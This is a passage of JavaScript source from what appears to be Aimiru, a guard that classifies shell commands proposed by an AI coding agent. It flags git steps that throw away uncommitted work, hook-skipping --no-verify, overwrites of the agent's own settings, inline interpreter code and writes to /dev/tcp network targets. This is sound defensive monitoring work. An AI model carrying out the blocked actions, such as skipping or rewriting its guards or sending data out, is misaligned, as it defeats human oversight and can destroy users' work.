 * A git pathspec that covers the whole working folder from where the command runs: ".", "./",
 * "..", ":/" and ":(top)" (with nothing more, "." or "*"), "*", or a path to that folder or one
 * that holds it. A pathspec named only when the command runs may be any of these. A single file or
 * a folder inside ("src/a.ts", "src/") is not.
 */
function coversWholeTree(word, isDynamic, ctx) {
  if (isDynamic) return true;
  let w = String(word);
  if (w.startsWith(':')) {
    // Pathspec magic: ":/" and ":(top,...)" start at the top of the repository; others where it runs.
    const magic = /^:(\/|\(([^)]*)\)|[!^]?)/.exec(w);
    if (magic && (magic[1] === '!' || magic[1] === '^')) return false; // an exclusion names what stays
    w = w.slice(magic ? magic[0].length : 1);
    return w === '' || w === '.' || w === './' || w === '*' || w === '**' || w === '**/*';
  }
  if (/[*?[]/.test(w)) {
    // A glob covers everything only as "*" or "**" at a folder that holds where it runs.
    const m = /^(.*?)(\*\*?)(\/\*)?$/.exec(w);
    if (!m || /[*?[]/.test(m[1])) return false;
    const dir = m[1] === '' ? '.' : m[1];
    return coversWholeTree(dir, false, ctx);
  }
  const norm = path.posix.normalize(w.replace(/\\/g, '/'));
  if (/^(\.\.\/)*(\.\.|\.)\/?$/.test(norm)) return true;
  if (!path.isAbsolute(w) && !/^~(\/|$)/.test(w)) {
    if (ctx.cwdUnknown) return false;
    return isWithin(ctx.cwd, path.resolve(ctx.cwd, w));
  }
  const p = resolvePathWord(w, ctx);
  if (!p) return true;
  return ctx.cwdUnknown ? isWithin(ctx.project, p) : isWithin(ctx.cwd, p);
}

/** git config's options that take the next word as their value (git 2.54). */
const GIT_CONFIG_VALUE_OPTIONS = new Set(['-f', '--file', '--blob', '--type', '--default', '--comment', '--value', '--url']);

/**
 * The files a git step writes where its command names them (git 2.54): --output (log, show, diff
 * and the rest), archive's -o, format-patch's -o and --output-directory, and bundle create's file.
 * Each as {word, dyn}.
 */
function gitWrittenFiles(sub, rest, restDyn) {
  const found = [];
  for (let k = 0; k < rest.length; k += 1) {
    const a = String(rest[k]);
    if (a === '--') break;
    const glued = /^--output(?:-directory)?=(.*)$/s.exec(a);
    if (glued) found.push({ word: glued[1], dyn: Boolean(restDyn[k]) });
    else if (a === '--output' || a === '--output-directory' || (a === '-o' && (sub === 'archive' || sub === 'format-patch'))) {
      found.push({ word: rest[k + 1], dyn: Boolean(restDyn[k + 1]) });
      k += 1;
    }
  }
  if (sub === 'bundle') {
    const at = rest.indexOf('create');
    const k = at === -1 ? -1 : rest.findIndex((w, i) => i > at && !String(w).startsWith('-'));
    if (k !== -1) found.push({ word: rest[k], dyn: Boolean(restDyn[k]) });
  }
  return found.filter((f) => typeof f.word === 'string' && f.word !== '');
}

/** git steps that run the guards, and the switch that skips them (commit also takes -n). */
const GIT_VERIFY_STEPS = new Set(['commit', 'push', 'merge', 'pull', 'am', 'rebase']);

/**
 * True when a word is git's long option `--<full>`, or a shortened one git takes for it ("--har"
 * for --hard, "--forc" for --force): at least `min` letters, enough to name no other option.
 */
function gitLong(word, full, min = 1) {
  const s = String(word);
  if (!s.startsWith('--')) return false;
  const name = s.slice(2).split('=')[0];
  return name.length >= min && full.startsWith(name);
}

/**
 * A pathspec that only leaves something out (":!src", ":^.env", ":(exclude)x"). When every pathspec
 * is one, git reads them as the whole tree less those (pathspec.c adds the rest itself).
 */
function isExcludePathspec(word) {
  const s = String(word);
  if (/^:[/!^]*[!^]/.test(s)) return true;
  const long = /^:\(([^)]*)\)/.exec(s);
  return Boolean(long && long[1].split(',').some((m) => m.trim() === 'exclude'));
}

/** Pathspecs that cover the whole folder: one that does, or only ones that leave something out. */
function pathspecsCoverWholeTree(pathspecs, ctx) {
  if (pathspecs.some((p) => coversWholeTree(p.w, p.dyn, ctx))) return true;
  return pathspecs.length > 0 && pathspecs.every((p) => !p.dyn && isExcludePathspec(p.w));
}

/**
 * Whether a short option word forces a checkout or a switch ("-f", "-qf", "-fb x"): letters are read
 * in order up to one that takes a value (-b, -B for checkout; -c, -C for switch).
 */
function shortForces(word, valueLetters) {
  const s = String(word);
  if (!/^-[A-Za-z0-9]+$/.test(s)) return false;
  for (const ch of s.slice(1)) {
    if (valueLetters.includes(ch)) return false;
    if (ch === 'f') return true;
  }
  return false;
}

/** git steps that print only a commit or a branch name, never an option. */
const GIT_COMMIT_PRINTERS = [
  /^git\s+rev-parse(\s+(--verify|-q|--quiet|--short(=\d+)?|--abbrev-ref|--symbolic-full-name|[^\s-]\S*))+$/,
  /^git\s+merge-base(\s+(--fork-point|--all|--octopus|[^\s-]\S*))+$/,
  /^git\s+rev-list(\s+(-n\s*\d+|--max-count=\d+|-\d+|--first-parent|--no-merges|--reverse|[^\s-]\S*))+$/,
  /^git\s+log(\s+(-n\s*\d+|--max-count=\d+|-\d+|--first-parent|--no-merges|--(format|pretty)=(t?format:)?%[Hh]|[^\s-]\S*))+$/,
  /^git\s+symbolic-ref(\s+(--short|-q|--quiet|[^\s-]\S*))+$/,
  /^git\s+branch\s+--show-current$/,
];

/**
 * What a word named only when the command runs most likely is (ADR-0111 review): 'var' for a
 * plain variable ("$SHA", "${REF}", "${REF:-main}"), 'commit' for a git step that prints only a
 * commit or a branch ("$(git merge-base HEAD main)", "$(git log -1 --format=%H)"), and
 * 'unknown' for anything else ("$(echo --hard)", "${X:---hard}", "--$(echo hard)"), which may be
 * any option or path.
 */
function runtimeWordKind(word, subs = []) {
  const w = String(word);
  if (/^\$(\w+|\{\w+\})$/.test(w) || /^\$\{\w+:?[-=]([^-$`{}][^$`{}]*)?\}$/.test(w)) return 'var';
  if (/^(\$\(\.\.\.\)|`\.\.\.`)$/.test(w) && subs.length === 1) {
    const text = String(subs[0]).trim();
    if (/[;&|<>`$()\\\n]/.test(text)) return 'unknown';
    const plain = text.replace(/['"]/g, '');
    if (/^git\s+log\b/.test(plain) && !/--(format|pretty)=/.test(plain)) return 'unknown';
    if (GIT_COMMIT_PRINTERS.some((re) => re.test(plain))) return 'commit';
  }
  return 'unknown';
}

/**
 * A git step's words with each plain variable this same command set put back ("m=--hard; git
 * reset $m"), so the step is read as it runs. Returns {words, dyn}.
 */
function withShellValues(words, dyn, values) {
  if (!values || !values.size) return { words, dyn };
  const outWords = [];
  const outDyn = [];
  words.forEach((w, k) => {
    const m = dyn[k] ? /^\$(?:(\w+)|\{(\w+)\})$/.exec(String(w)) : null;
    const v = m ? values.get(m[1] ?? m[2]) : null;
    if (v && !v.dynamic) {
      outWords.push(v.value);
      outDyn.push(false);
    } else {
      outWords.push(w);
      outDyn.push(Boolean(dyn[k]));
    }
  });
  return { words: outWords, dyn: outDyn };
}

/** Options of git checkout and restore that take the next word as their value (git 2.54). */
const GIT_PATHSPEC_VALUE_OPTIONS = new Set(['-b', '-B', '--orphan', '-s', '--source', '--conflict', '--pathspec-from-file']);

/**
 * The maker's settings or Aimiru's files that git checkout or restore names as a path (review of
 * wk/connectors-flow, 28 Oct), or null. Every word that is not an option is read as a path, so a
 * branch or commit named like one is asked about, never let through; a folder that holds one counts,
 * apart from the project folder itself or one above it, whose whole-tree discard is read already.
 * A word built when the command runs is left to the rules for those.
 */
function gitProtectedPathspec(sub, words, dyn, ctx) {
  if (sub !== 'checkout' && sub !== 'restore') return null;
  let options = true;
  for (let k = 0; k < words.length; k += 1) {
    const w = String(words[k] ?? '');
    if (options && w === '--') {
      options = false;
      continue;
    }
    if (options && w.startsWith('-')) {
      if (GIT_PATHSPEC_VALUE_OPTIONS.has(w)) k += 1;
      continue;
    }
    if (dyn[k] || !w) continue;
    const p = resolvePathWord(w, ctx);
    if (!p) continue;
    if (isProtectedPath(p, ctx) || (holdsProtectedPath(p, ctx) && !(ctx.project && isWithin(ctx.project, p)))) return p;
  }
  return null;
}

/**
 * What a git step does to uncommitted work or to the guards (ADR-0111), from its words after the
 * step (an alias's own words first). git's shortened long options count ("--har"). A word named
 * only when the command runs is read as the worst it could be, unless it is a plain variable or
 * git's own answer for a commit (runtimeWordKind). Returns [{resource, why, protectedChange?}].
 */
function gitIncidentSteps(sub, rawWords, rawDyn, ctx, subs = [], values = null) {
  const { words, dyn } = withShellValues(rawWords, rawDyn, values);
  const found = [];
  const discard = (why) => found.push({ resource: INCIDENT_RESOURCES.discardWork, why });
  const unknownWord = (k) => Boolean(dyn[k]) && runtimeWordKind(words[k], subs[k]) === 'unknown';
  // "git checkout HEAD~1 -- .claude/settings.json", "git restore --source=X ~/.codex/hooks.json":
  // another copy written over the maker's settings or Aimiru's files, a protected change.
  const settings = gitProtectedPathspec(sub, words, dyn, ctx);
  if (settings) found.push({ resource: INCIDENT_RESOURCES.removeGuard, why: `writes another copy over ${settings}, the agent's own settings or Aimiru's files`, protectedChange: true });
  if (sub === 'reset') {
    // The last mode wins. A plain variable or git's answer for a commit ("git reset $SHA", "git
    // reset $(git merge-base HEAD main)") keeps the work; any other word named when it runs may
    // be --hard ("git reset $(echo --hard)", "git reset ${X:---hard}").
    let mode = null;
    for (let k = 0; k < words.length; k += 1) {
      const w = words[k];
      if (w === '--') break;
      if (unknownWord(k)) mode = 'maybe';
      else if (dyn[k]) continue;
      else if (gitLong(w, 'hard', 1)) mode = 'hard';
      else if (gitLong(w, 'soft', 2) || gitLong(w, 'mixed', 2) || gitLong(w, 'keep', 1) || gitLong(w, 'merge', 2)) mode = 'other';
    }
    if (mode === 'hard') discard('throws away uncommitted changes (git reset --hard)');
    if (mode === 'maybe') discard('may throw away uncommitted changes (git reset with an option named only when it runs)');
  } else if (sub === 'worktree') {
    // git worktree remove --force takes a worktree away with its uncommitted changes; without
    // --force git refuses to.
    const k = words.findIndex((w) => !String(w).startsWith('-'));
    const forced = (w) => gitLong(w, 'force', 1) || (/^-[A-Za-z]*f/.test(String(w)) && !String(w).startsWith('--'));
    if (words[k] === 'remove' && words.slice(k + 1).some(forced)) {
      discard('throws away a worktree with its uncommitted changes (git worktree remove --force)');
    } else if (k !== -1 && unknownWord(k)) discard('may throw away a worktree (git worktree with a step named only when it runs)');
  } else if (sub === 'checkout-index') {
    // git checkout-index -a -f writes every file over the working folder.
    const all = words.some((w) => gitLong(w, 'all', 1) || (/^-[A-Za-z]+$/.test(String(w)) && String(w).includes('a')));
    const force = words.some((w) => gitLong(w, 'force', 1) || (/^-[A-Za-z]+$/.test(String(w)) && String(w).includes('f')));
    if (all && force) discard('throws away uncommitted changes (git checkout-index --all --force)');
  } else if (sub === 'read-tree') {
    // git read-tree --reset -u writes the tree over the working folder.
    const reset = words.some((w) => w === '--reset');
    const update = words.some((w) => w === '-u' || /^-[A-Za-z]*u[A-Za-z]*$/.test(String(w)));
    if (reset && update) discard('throws away uncommitted changes (git read-tree --reset -u)');
  } else if (sub === 'clean') {
    const letters = new Set();
    let dry = false;
    const pathspecs = [];
    let options = true;
    for (let k = 0; k < words.length; k += 1) {
      const w = String(words[k]);
      if (options && w === '--') {
        options = false;
        continue;
      }
      if (options && (w === '-e' || (gitLong(w, 'exclude', 1) && !w.includes('=')))) {
        k += 1;
        continue;
      }
      if (options && /^--/.test(w)) {
        if (gitLong(w, 'force', 1)) letters.add('f');
        if (gitLong(w, 'dry-run', 1)) dry = true;
        continue;
      }
      if (options && /^-[A-Za-z]+$/.test(w)) {
        for (const ch of w.slice(1)) {
          if (ch === 'e') break; // -e<pattern>: the rest is the pattern
          letters.add(ch);
        }
        continue;
      }
      pathspecs.push({ w, dyn: Boolean(dyn[k]) });
    }
    if (letters.has('n')) dry = true;
    // A word named only when it runs may be the options themselves ("git clean $FLAGS"). With -f,
    // every untracked file goes (and folders with -d); only -X alone keeps them, taking ignored files.
    const removes = (letters.has('f') && (letters.has('x') || !letters.has('X'))) || pathspecs.some((p) => p.dyn);
    if (removes && !dry && (pathspecs.length === 0 || pathspecsCoverWholeTree(pathspecs, ctx))) {
      discard('throws away files git does not track (git clean)');
    }
  } else if (sub === 'checkout' || sub === 'switch') {
    let force = false;
    for (const w of words) {
      if (w === '--') break;
      if (gitLong(w, 'force', 1) || (sub === 'switch' && gitLong(w, 'discard-changes', 2)) || shortForces(w, sub === 'checkout' ? 'bB' : 'cC')) force = true;
    }
    if (force) {
      discard(`throws away uncommitted changes (git ${sub} --force)`);
    } else if (sub === 'checkout') {
      let afterDashes = false;
      const before = [];
      const after = [];
      let fromFile = false;
      for (let k = 0; k < words.length; k += 1) {
        const w = String(words[k]);
        if (!afterDashes && w === '--') {
          afterDashes = true;
          continue;
        }
        if (!afterDashes && /^--pathspec-from-file(=|$)/.test(w)) {
          fromFile = true;
          break;
        }
        if (!afterDashes && w.startsWith('-')) {
          if (['-b', '-B', '--orphan'].includes(w)) k += 1;
          continue;
        }
        // Before "--", a plain variable or git's answer for a commit is most often a branch; any
        // other word named when it runs may be a path ("$(git rev-parse --show-toplevel)").
        (afterDashes ? after : before).push({ w, dyn: Boolean(dyn[k]) && (afterDashes || unknownWord(k)) });
      }
      // Without "--", the first word is a branch or a commit unless it is a path that is there.
      const isPath = (p) => {
        if (ctx.cwdUnknown) return false;
        try {
          return fs.existsSync(path.resolve(ctx.cwd, p.w));
        } catch {
          return false;
        }
      };
      const pathspecs = afterDashes ? after : before.filter((p, i) => i > 0 || isExcludePathspec(p.w) || isPath(p));
      if (fromFile) discard('may throw away uncommitted changes (git checkout of paths from a file)');
      else if ([...before, ...after].some((p) => coversWholeTree(p.w, p.dyn, ctx)) || pathspecsCoverWholeTree(pathspecs, ctx)) {
        discard('throws away uncommitted changes (git checkout of the whole folder)');
      }
    }
  } else if (sub === 'restore') {
    let staged = false;
    let worktree = false;
    const pathspecs = [];
    let fromFile = false;
    let options = true;
    for (let k = 0; k < words.length; k += 1) {
      const w = String(words[k]);
      if (options && w === '--') {
        options = false;
        continue;
      }
      if (options && w.startsWith('-')) {
        if (gitLong(w, 'staged', 2)) staged = true;
        else if (gitLong(w, 'worktree', 1)) worktree = true;
        else if (w === '-s' || (gitLong(w, 'source', 2) && !w.includes('='))) k += 1;
        else if (/^--pathspec-from-file(=|$)/.test(w)) fromFile = true;
        else if (/^-[A-Za-z]+$/.test(w) && !w.startsWith('-s')) {
          if (w.includes('S')) staged = true;
          if (w.includes('W')) worktree = true;
        }
        continue;
      }
      pathspecs.push({ w, dyn: Boolean(dyn[k]) });
    }
    if ((worktree || !staged) && (fromFile || pathspecsCoverWholeTree(pathspecs, ctx))) {
      discard('throws away uncommitted changes (git restore of the whole folder)');
    }
  } else if (sub === 'rm') {
    // git rm -f takes files away with their uncommitted changes; without -f git refuses to.
    let force = false;
    let recursive = false;
    let cached = false;
    let dry = false;
    let fromFile = false;
    const pathspecs = [];
    let options = true;
    for (let k = 0; k < words.length; k += 1) {
      const w = String(words[k]);
      if (options && w === '--') {
        options = false;
        continue;
      }
      if (options && /^--/.test(w)) {
        if (gitLong(w, 'force', 1)) force = true;
        else if (gitLong(w, 'cached', 1)) cached = true;
        else if (gitLong(w, 'dry-run', 1)) dry = true;
        else if (/^--pathspec-from-file(=|$)/.test(w)) fromFile = true;
        continue;
      }
      if (options && /^-[A-Za-z]+$/.test(w)) {
        if (w.includes('f')) force = true;
        if (w.includes('r')) recursive = true;
        if (w.includes('n')) dry = true;
        continue;
      }
      pathspecs.push({ w, dyn: Boolean(dyn[k]) });
    }
    const whole = fromFile || pathspecs.some((p) => (recursive || /[*?[]/.test(p.w)) && coversWholeTree(p.w, p.dyn, ctx)) || (pathspecs.length > 0 && pathspecs.every((p) => !p.dyn && isExcludePathspec(p.w)));
    if (force && !cached && !dry && whole) discard('throws away uncommitted changes (git rm -f of the whole folder)');
  } else if (sub === 'stash') {
    // The step is the first word that is not an option ("-m" takes a message); "--" ends them.
    let k = 0;
    for (; k < words.length; k += 1) {
      const w = String(words[k]);
      if (w === '--') {
        k = words.length;
        break;
      }
      if (w === '-m' || w === '--message') k += 1;
      else if (!w.startsWith('-')) break;
    }
    const step = words[k];
    if (step === 'drop' || step === 'clear') discard(`throws away saved work (git stash ${step})`);
    else if (k < words.length && dyn[k]) discard('may throw away saved work (git stash with a step named only when it runs)');
  }
  if (GIT_VERIFY_STEPS.has(sub)) {
    // "--no-veri" is the shortest git takes ("--no-ver" could be --no-verbose). A commit's -m, -F,
    // -c, -C and -t take the next word as their value: in "git commit -m -n" the -n is the message.
    let skips = false;
    for (let k = 0; k < words.length; k += 1) {
      const w = String(words[k]);
      if (w === '--') break;
      if (gitLong(w, 'no-verify', 7)) skips = true;
      else if (sub === 'commit' && /^-[a-zA-Z]+$/.test(w)) {
        if (/^[^mFcCtS]*n/.test(w.slice(1))) skips = true;
        else if (/[mFcCt]$/.test(w)) k += 1;
      } else if (sub === 'commit' && /^--(message|file|reuse-message|reedit-message|template|author|date|fixup|squash|trailer|cleanup)$/.test(w)) k += 1;
    }
    if (skips) found.push({ resource: INCIDENT_RESOURCES.removeGuard, why: `skips the git guards (git ${sub} --no-verify)` });
  }
  return found;
}


// How each interpreter reads its own options, getopt style for short ones:
//   value     letters that take a value, glued or the next word
//   glued     letters that take only a glued value ("ruby -Fx", "perl -i.bak")
//   code      letters whose value is code; module: whose value is a module; script: a script file
//   loads     letters whose value is code loaded first (node -r, ruby -r, perl -M); dirs: include folders
//   search    letters that look the script up on the search path; server: letters that serve files
//   long, longBool, longPrefixes: long options taking a value, switches, and families of switches
//   longCode, longScript, longLoads, longDirs, longServer: as above, for long options
// An option not listed here makes the command unknown: failing closed is safer than guessing.
const INTERPRETER_OPTIONS = {
  python: {
    value: 'cmWX', code: 'c', module: 'm',
    long: ['check-hash-based-pycs'], longBool: ['version', 'help', 'help-env', 'help-xoptions', 'help-all'],
  },
  node: {
    value: 'eprC', code: 'ep', loads: 'r',
    longDirs: ['env-file', 'env-file-if-exists', 'experimental-config-file', 'snapshot-blob'],
    long: ['conditions', 'input-type', 'title', 'stack-size', 'inspect-port', 'watch-path', 'test-name-pattern', 'test-reporter', 'test-reporter-destination', 'disable-warning', 'redirect-warnings', 'icu-data-dir', 'report-dir', 'report-filename', 'cpu-prof-dir', 'heap-prof-dir', 'diagnostic-dir', 'unhandled-rejections', 'max-http-header-size', 'test-concurrency', 'test-timeout'],
    longBool: ['version', 'help', 'inspect', 'inspect-brk', 'inspect-wait', 'watch', 'watch-preserve-output', 'test', 'test-only', 'check', 'enable-source-maps', 'no-warnings', 'no-deprecation', 'pending-deprecation', 'throw-deprecation', 'expose-gc', 'abort-on-uncaught-exception', 'preserve-symlinks', 'preserve-symlinks-main', 'frozen-intrinsics', 'interactive', 'no-addons', 'use-strict', 'prof', 'cpu-prof', 'heap-prof', 'zero-fill-buffers', 'jitless', 'insecure-http-parser', 'force-fips', 'enable-fips', 'v8-options', 'completion-bash'],
    longPrefixes: ['experimental-', 'no-experimental-', 'harmony', 'max-old-space-size', 'max-semi-space-size', 'stack-trace-limit', 'trace-', 'heapsnapshot-', 'report-on-', 'test-coverage-'],
    longCode: ['eval', 'print'], longLoads: ['require', 'import', 'loader', 'experimental-loader'],
  },
  bun: {
    value: 'eprc', code: 'ep', loads: 'r',
    long: ['tsconfig-override', 'define', 'loader', 'main-fields', 'jsx-factory', 'jsx-fragment', 'jsx-import-source', 'jsx-runtime', 'external', 'port', 'origin', 'extension-order', 'conditions'],
    longBool: ['version', 'help', 'watch', 'hot', 'smol', 'silent', 'bun', 'revision', 'no-install', 'prefer-offline', 'prefer-latest', 'no-clear-screen', 'if-present', 'inspect', 'inspect-brk', 'inspect-wait'],
    longCode: ['eval', 'print'], longLoads: ['preload'], longDirs: ['cwd', 'config', 'env-file'],
  },
  ruby: {
    value: 'eIrEC', glued: 'FxTW0Kil', code: 'e', loads: 'r', dirs: 'IC', search: 'S',
    long: ['encoding', 'external-encoding', 'internal-encoding', 'backtrace-limit', 'crash-report', 'parser', 'dump'],
    longBool: ['version', 'help', 'verbose', 'copyright', 'yydebug', 'jit', 'yjit', 'rjit'],
    longPrefixes: ['disable', 'enable', 'yjit-', 'rjit-', 'jit-'],
  },
  perl: {
    value: 'eEIMm', glued: 'xilF0CdDV', code: 'eE', loads: 'Mm', modules: 'Mm', dirs: 'I', search: 'S', debugger: 'd',
    longBool: ['version', 'help'],
  },
  php: {
    value: 'rcdftzSBREF', code: 'rBRE', script: 'fF', server: 'S', dirs: 'ct', loads: 'z', ini: 'd',
    long: ['docroot', 'rf', 'rc', 're', 'rz', 'ri'], longDirs: ['php-ini'], longLoads: ['zend-extension'], longIni: ['define'],
    longBool: ['no-php-ini', 'syntax-check', 'hide-args', 'interactive', 'modules', 'no-header', 'info', 'version', 'help', 'ini', 'strip'],
    longCode: ['run', 'process-begin', 'process-code', 'process-end'], longScript: ['file', 'process-file'], longServer: ['server'],
  },
};
INTERPRETER_OPTIONS.python3 = INTERPRETER_OPTIONS.python;

/**
 * Where an interpreter takes its program from. Options are read only up to the first operand,
 * "-" or "--": a "-c" after a script name is the script's own argument.
 * @returns {{code?: {text: string, dynamic: boolean}, module?: string, operandAt?: number, operand?: string,
 *   operandDynamic?: boolean, unknown?: string, loads: Array<{value: string, dynamic: boolean, dir?: boolean}>}}
 */
function interpreterProgram(prog, args, argDyn) {
  const spec = INTERPRETER_OPTIONS[prog];
  const loads = [];
  const result = (r) => ({ loads, ...r });
  if (prog === 'deno') {
    // deno <step> ...: eval takes code; run takes a script; other steps are read below.
    const k = nonFlagIndex(args);
    if (args[k] === 'eval') return result({ code: { text: args[k + 1] ?? '', dynamic: Boolean(argDyn[k + 1]) } });
    if (args[k] === 'run') return result({ operandAt: k + 1 + nonFlagIndex(args.slice(k + 1)) });
    return result({ operandAt: k });
  }
  for (let k = 0; k < args.length; k += 1) {
    const a = args[k];
    if (a === '--') return result({ operandAt: k + 1 });
    if (a === '-' || !a.startsWith('-')) return result({ operandAt: k });
    if (a.startsWith('--')) {
      const eq = a.indexOf('=');
      const name = a.slice(2, eq === -1 ? undefined : eq);
      const take = () => {
        if (eq !== -1) return { value: a.slice(eq + 1), dynamic: Boolean(argDyn[k]) };
        k += 1;
        return { value: args[k] ?? '', dynamic: Boolean(argDyn[k]) };
      };
      if ((spec.longCode || []).includes(name)) {
        const v = take();
        return result({ code: { text: v.value, dynamic: v.dynamic } });
      }
      if ((spec.longScript || []).includes(name)) {
        const v = take();
        return result({ operandAt: -1, operand: v.value, operandDynamic: v.dynamic });
      }
      if ((spec.longServer || []).includes(name)) return result({ unknown: `runs ${prog} as a web server` });
      if ((spec.longLoads || []).includes(name) || (spec.longDirs || []).includes(name)) {
        const v = take();
        loads.push({ ...v, dir: (spec.longDirs || []).includes(name) });
        continue;
      }
      if ((spec.longIni || []).includes(name)) {
        const v = take();
        if (/extension|auto_(prepend|append)_file/i.test(v.value) || v.dynamic) return result({ unknown: `runs ${prog} with settings that load other code` });
        continue;
      }
      if ((spec.long || []).includes(name)) {
        if (eq === -1) k += 1;
        continue;
      }
      if ((spec.longBool || []).includes(name) || (spec.longPrefixes || []).some((p) => name.startsWith(p))) continue;
      return result({ unknown: `runs ${prog} with an option Aimiru does not know (--${name})` });
    }
    if (prog === 'node' && (a === '-pe' || a === '-ep')) return result({ code: { text: args[k + 1] ?? '', dynamic: Boolean(argDyn[k + 1]) } });
    for (let j = 1; j < a.length; j += 1) {
      const ch = a[j];
      const rest = a.slice(j + 1);
      if ((spec.search || '').includes(ch)) return result({ unknown: `${prog} -${ch} looks its script up on the search path` });
      if ((spec.server || '').includes(ch)) return result({ unknown: `runs ${prog} as a web server` });
      // perl -d:Module, -dt:Module: a debugger module, loaded by name only.
      if ((spec.debugger || '').includes(ch) && rest && !/^t?(:[A-Za-z_]\w*(::\w+)*(=[\w,.:-]*)?)?$/.test(rest)) return result({ unknown: `runs ${prog} with a debugger Aimiru cannot place` });
      if ((spec.glued || '').includes(ch)) break; // an optional value, glued only
      if (!spec.value.includes(ch)) continue; // a switch
      let value = rest;
      let dynamic = Boolean(argDyn[k]);
      if (!rest) {
        k += 1;
        value = args[k] ?? '';
        dynamic = Boolean(argDyn[k]);
      }
      if (spec.code.includes(ch)) return result({ code: { text: value, dynamic } });
      if (spec.module === ch) return result({ module: value, moduleDynamic: dynamic });
      // php -d name=value: settings that load other code (extension, auto_prepend_file) are unknown.
      if ((spec.ini || '').includes(ch)) {
        if (/extension|auto_(prepend|append)_file/i.test(value) || dynamic) return result({ unknown: `runs ${prog} with settings that load other code` });
        break;
      }
      // perl -MName, -mName: "use Name" is written into the program, so only a module name is safe.
      if ((spec.modules || '').includes(ch) && !/^-?[A-Za-z_]\w*(::\w+)*(=[\w,.:-]*)?$/.test(value)) return result({ unknown: `runs ${prog} with a module option that holds code` });
      if ((spec.script || '').includes(ch)) return result({ operandAt: -1, operand: value, operandDynamic: dynamic });
      if ((spec.loads || '').includes(ch) || (spec.dirs || '').includes(ch)) loads.push({ value, dynamic, dir: (spec.dirs || '').includes(ch) });
      break;
    }
  }
  return result({ operandAt: args.length });
}

/**
 * Code flags after the operand ("python3 x.py -c '...'"): the script's own arguments, but read as
 * code too, so a payment or a command hidden there still counts.
 */
function laterInlineCode(prog, args, argDyn, from) {
  const spec = INTERPRETER_OPTIONS[prog];
  if (!spec) return [];
  const found = [];
  for (let k = Math.max(0, from); k < args.length; k += 1) {
    const a = args[k];
    const long = /^--([^=]+)(=(.*))?$/s.exec(a);
    if (long) {
      if ((spec.longCode || []).includes(long[1])) found.push(long[2] ? { text: long[3], dynamic: Boolean(argDyn[k]) } : { text: args[k + 1] ?? '', dynamic: Boolean(argDyn[k + 1]) });
      continue;
    }
    if (!/^-[A-Za-z]/.test(a)) continue;
    for (let j = 1; j < a.length; j += 1) {
      const ch = a[j];
      if (spec.code.includes(ch)) {
        const rest = a.slice(j + 1);
        found.push(rest ? { text: rest, dynamic: Boolean(argDyn[k]) } : { text: args[k + 1] ?? '', dynamic: Boolean(argDyn[k + 1]) });
        break;
      }
      if ((spec.value || '').includes(ch) || (spec.glued || '').includes(ch)) break;
    }
  }
  return found;
}

function nonFlagIndex(words) {
  const k = words.findIndex((w) => !w.startsWith('-') || w === '-');
  return k === -1 ? words.length : k;
}

/** Inline code that runs programs or evaluates text: given another program's output, it can run anything. */
const RUNS_PROGRAMS_RE = /\b(exec\w*|eval|system|popen\w*|spawn\w*|subprocess|child_process|Function|qx|Kernel|IO\.popen|shell_exec|passthru|proc_open)\b|`|%x[({[]/;

/** Python modules that are project tools or local work (python -m <module>). */
const PYTHON_LOCAL_MODULES = new Set(['pytest', 'unittest', 'doctest', 'json.tool', 'venv', 'virtualenv', 'mypy', 'ruff', 'black', 'isort', 'flake8', 'pylint', 'pyright', 'coverage', 'pdb', 'timeit', 'compileall', 'py_compile', 'build', 'tox', 'nox', 'cProfile', 'profile', 'tabnanny', 'pydoc', 'site', 'sysconfig', 'platform', 'tokenize', 'ast', 'dis', 'calendar', 'this']);

/** Programs whose first word after the program picks what they do (git push, gh pr create, stripe ...). */
let SUBCOMMAND_PROGRAMS = null;
function isSubcommandProgram(prog) {
  if (!SUBCOMMAND_PROGRAMS) {
    SUBCOMMAND_PROGRAMS = new Set([
      ...Object.keys(PUBLISH), ...Object.keys(LOGIN_COMMANDS), ...Object.keys(INSTALL_SUBCOMMANDS), ...CLOUD_CLIS, ...SYSTEM_WRITERS,
      'gh', 'glab', 'stripe', 'twilio', 'gcalcli', 'cast', 'solana', 'spl-token', 'bitcoin-cli', 'diskutil', 'security', 'osascript',
    ]);
  }
  return SUBCOMMAND_PROGRAMS.has(prog);
}

function classifyTargetsForWrite(targets, dyn, ctx, out) {
  targets.forEach((t, idx) => {
    if (t === '/dev/null' || t === '/dev/stdout' || t === '/dev/stderr' || /^\/dev\/fd\//.test(t) || t === '-') return;
    const p = dyn?.[idx] ? null : resolvePathWord(t, ctx);
    // A program this same command writes before it runs is new, whatever the last commit holds.
    noteWritten(out, p);
    if (p && isProtectedPath(p, ctx)) {
      protectedChange(out, `changes ${p}, the agent's own settings or Aimiru's files`);
      return;
    }
    if (!p || !isInsideWorkArea(p, ctx)) {
      out.classes.push('write');
      out.why.push(`writes outside the project: ${p || t}`);
    }
  });
}

function classifySegment(seg, ctx, out, depth) {
  out.seen.push(seg.words.join(' '));
  if (seg.funcDef) return; // name() { ... }: the body is read where it is written
  const { words, dynamic, expand, quoted, subst, elevated, viaXargs, assignments } = stripWrappers(seg);
  // Variables set for the program (NAME=value cmd, env NAME=value cmd); with no program after
  // them they are plain shell variables, which the commands after this one see.
  for (const a of assignments) {
    const eq = a.w.indexOf('=');
    variableSet(variableName(a.w), a.w.slice(eq + 1), a.dyn, ctx, out, depth, { exported: words.length > 0 || ctx.allexport === true });
    if (!words.length) noteShellValue(out, variableName(a.w), a.w.slice(eq + 1), a.dyn);
  }
  // More than one input (bash <<'EOF' < x.sh): the last one wins, so the here-document read is not
  // what runs. Unknown.
  if ((seg.redirects || []).filter((r) => INPUT_REDIRECTS.has(r.op)).length > 1) unknownProgram(out, 'runs commands with more than one input');
  // Redirections first: they apply whatever the program is. What is written to bash's
  // /dev/tcp/HOST/PORT or /dev/udp/HOST/PORT goes over the network: data leaving for that host
  // (ADR-0146), not a file written. To this computer it stays a write, as before.
  const toNetwork = new Set();
  for (const r of seg.redirects || []) {
    if (r.op === '<' || r.op.startsWith('<<')) continue;
    const t = devNetTarget(r.target, Boolean(r.dynamic));
    if (!t || t.local) continue;
    toNetwork.add(r);
    sharesWith(out, t.unknown ? null : t.host, { unknown: t.unknown, why: 'sends data to another computer' });
  }
  const writeTargets = seg.redirects.filter((r) => !toNetwork.has(r) && (r.op.startsWith('>') || r.op.startsWith('&>'))).map((r) => r.target);
  classifyTargetsForWrite(writeTargets, null, ctx, out);
  // A redirection over a git guard empties or rewrites it (ADR-0111), whatever the program; one
  // that writes into a git settings file is never local work (guardRedirect).
